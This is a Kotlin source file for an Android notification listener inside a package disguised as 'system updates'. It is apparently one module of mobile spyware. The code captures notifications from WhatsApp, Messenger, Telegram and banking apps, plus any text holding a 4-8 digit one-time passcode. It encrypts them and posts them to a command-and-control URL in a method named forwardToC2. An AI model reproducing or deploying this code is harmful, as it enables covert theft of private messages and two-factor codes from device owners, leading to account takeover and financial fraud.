package com.system.updates.modules.data

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetworkUtils
import org.json.JSONObject

class NotificationService : NotificationListenerService() {
    private val crypto by lazy { CryptoManager(this) }
    private val network by lazy { NetworkUtils(this) }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""

        if (shouldForward(pkg, title, text)) {
            forwardToC2(pkg, title, text)
        }
    }

    private fun shouldForward(pkg: String, title: String, text: String): Boolean {
        val sensitiveApps = listOf("com.whatsapp", "com.facebook.orca", "com.android.bank", "com.telegram")
        val hasOtp = text.contains(Regex("\\b\\d{4,8}\\b"))
        return (sensitiveApps.contains(pkg) || hasOtp)
    }

    private fun forwardToC2(pkg: String, title: String, text: String) {
        val payload = JSONObject().apply {
            put("type", "notification")
            put("package", pkg)
            put("title", title)
            put("text", text)
            put("time", System.currentTimeMillis())
        }
        val key = crypto.deriveDeviceKey()
        val encrypted = crypto.encryptData(payload.toString().toByteArray(), key)
        network.httpPost("https://your-c2-server.com/collect", "data=$encrypted")
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        Log.d("NotifService", "Removed: ${sbn.packageName}")
    }
}